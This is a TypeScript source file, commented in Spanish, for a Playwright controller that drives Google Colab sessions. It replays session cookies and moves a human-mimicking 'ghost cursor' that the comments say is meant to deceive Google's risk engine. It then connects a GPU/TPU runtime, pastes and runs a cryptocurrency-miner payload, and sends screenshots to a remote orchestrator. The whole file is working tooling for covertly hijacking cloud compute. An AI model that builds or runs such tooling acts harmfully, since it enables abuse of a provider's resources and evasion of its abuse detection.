// =================================================================
// APARATO: COLAB CONTROLLER (HUMAN OPERATOR & SURVEILLANCE)
// RESPONSABILIDAD: NAVEGACIÓN, INYECCIÓN Y TRANSMISIÓN VISUAL
// =================================================================

import { Page } from 'playwright';
import { createCursor } from 'ghost-cursor-playwright';
import axios from 'axios';
import { config } from '../config';
import { generateMinerPayload } from './payload';
import chalk from 'chalk';

export class ColabController {
  private page: Page;
  private workerId: string;
  private prefix: string;
  private cursor: any; // Ghost Cursor instance
  private surveillanceInterval: NodeJS.Timeout | null = null;

  constructor(page: Page, index: number) {
    this.page = page;
    this.workerId = `colab-node-${index}-${Date.now().toString().slice(-4)}`;
    this.prefix = chalk.cyan(`[${this.workerId}]`);
  }

  async deploy() {
    try {
      // 1. Inicializar Cursor Humano
      this.cursor = await createCursor(this.page);

      // 2. Secuencia de Despliegue
      await this.navigate();
      await this.checkAuth();
      await this.connectRuntime();
      await this.injectAndRun();

      // 3. Iniciar Vigilancia Visual (Panóptico)
      this.startSurveillance();

      console.log(`${this.prefix} ${chalk.green('✅ DESPLIEGUE COMPLETADO.')}`);
    } catch (e: any) {
      console.error(`${this.prefix} ${chalk.red('❌ ERROR CRÍTICO:')}`, e.message);
      await this.reportSnapshot('error'); // Foto del crimen
      throw e;
    }
  }

  private async navigate() {
    console.log(`${this.prefix} Navegando a zona objetivo...`);
    await this.page.goto(config.COLAB_URL, { waitUntil: 'domcontentloaded' });
    // Movimiento humano aleatorio para calentar el motor de riesgo de Google
    await this.cursor.move(Math.random() * 500, Math.random() * 500);
  }

  private async checkAuth() {
    // Verificamos si Google nos pide login (señal de cookies muertas)
    try {
        const signInBtn = this.page.getByText('Sign in');
        if (await signInBtn.isVisible({ timeout: 5000 })) {
             throw new Error('COOKIES CADUCADAS: Login requerido.');
        }
    } catch (e) {
        // Timeout significa que no vio el botón, lo cual es bueno.
    }
  }

  private async connectRuntime() {
    console.log(`${this.prefix} 🔌 Conectando Runtime (GPU/TPU)...`);

    // Buscar botón con selectores tolerantes
    const connectBtn = this.page.getByText(/^Connect$|^Reconnect$/i).first();

    if (await connectBtn.isVisible()) {
        // Clic humano (no instantáneo)
        await this.cursor.click(connectBtn);
    }

    // Esperar a que la UI de recursos aparezca (RAM/Disk)
    await this.page.waitForSelector('colab-memory-usage-sparkline', { timeout: 45000 });
  }

  private async injectAndRun() {
    console.log(`${this.prefix} 💉 Inyectando Payload...`);

    // Clic en el editor
    const editor = this.page.locator('.view-lines').first();
    await this.cursor.click(editor);

    // Limpieza y pegado
    await this.page.keyboard.press('Control+A');
    await this.page.keyboard.press('Delete');

    const payload = generateMinerPayload(this.workerId);
    await this.page.evaluate((text) => navigator.clipboard.writeText(text), payload);
    await this.page.keyboard.press('Control+V');

    await this.page.waitForTimeout(800); // Pausa para "pensar"
    await this.page.keyboard.press('Control+Enter');
  }

  // --- MÓDULO DE VIGILANCIA ---

  private startSurveillance() {
    if (this.surveillanceInterval) clearInterval(this.surveillanceInterval);

    // Enviar telemetría visual cada 10 segundos
    this.surveillanceInterval = setInterval(async () => {
      try {
        await this.reportSnapshot('running');
      } catch (e) {
        // Silencioso para no ensuciar logs
      }
    }, 10000);
  }

  private async reportSnapshot(status: 'running' | 'error' | 'captcha') {
    if (!config.ORCHESTRATOR_URL) return;

    // Captura JPEG calidad media (balance velocidad/calidad)
    const buffer = await this.page.screenshot({ quality: 40, type: 'jpeg' });
    const base64Image = `data:image/jpeg;base64,${buffer.toString('base64')}`;

    try {
        await axios.post(
            `${config.ORCHESTRATOR_URL}/api/v1/admin/worker-snapshot`,
            {
                worker_id: this.workerId,
                status: status,
                snapshot_base64: base64Image,
                timestamp: new Date().toISOString()
            },
            {
                headers: { 'Authorization': `Bearer ${config.WORKER_AUTH_TOKEN}` },
                timeout: 3000 // No bloquear el hilo si el servidor está lento
            }
        );
    } catch (e) {
        // Error de red al enviar snapshot, no crítico
    }
  }
}
